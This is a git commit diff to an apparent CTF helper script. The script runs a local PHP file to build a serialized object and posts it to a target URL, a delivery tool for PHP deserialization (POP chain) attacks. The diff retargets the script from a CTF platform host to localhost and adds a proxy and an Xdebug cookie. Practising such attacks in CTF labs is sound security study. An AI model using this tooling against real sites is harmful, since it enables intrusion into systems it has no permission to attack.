085c77180efa392f9c1b48a954c547a986e55b8b
wgf4242 <wgf4242@gmail.com>
2023-10-18 07:17:37 +0800

    sync

--- docs/ctf/scripts/web/web_php_send_serialized.py
+++ docs/ctf/scripts/web/web_php_send_serialized.py
@@ -5,26 +5,38 @@ from urllib.parse import unquote
 import subprocess
 from requests_html import HTMLSession
 import re
+from pathlib import Path
 
-url = 'http://366a153f-115e-46e1-b214-49b94b3c423b.node4.buuoj.cn:81/'
-key = 'unser'
+url = 'http://localhost/1.php'
+key = 'pop'
 php = r'D:\phpstudy_pro\Extensions\php\php7.3.4nts\php.exe'
 
+print(__file__)
+parent = Path(__file__).parent
+exp = (parent / 'exp.php').absolute()
+
 s = HTMLSession()
-output = subprocess.getoutput(f'{php} exp.php')
+output = subprocess.getoutput(f'{php} -f {exp}')
 
 ser = re.search(r'O:.*', output).group()
 
 data = {key: ser}
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+proxies = {}
+headers = {
+    'cookie': 'XDEBUG_SESSION=XDEBUG_ECLIPSE;',
+}
+
+
 
 
 def get():
-    res = s.post(url, params=data)
+    res = s.post(url, headers=headers, params=data, proxies=proxies)
     return res.text
 
 
 def post():
-    res = s.post(url, data=data)
+    res = s.post(url, headers=headers, data=data, proxies=proxies)
     return res.text
 
 
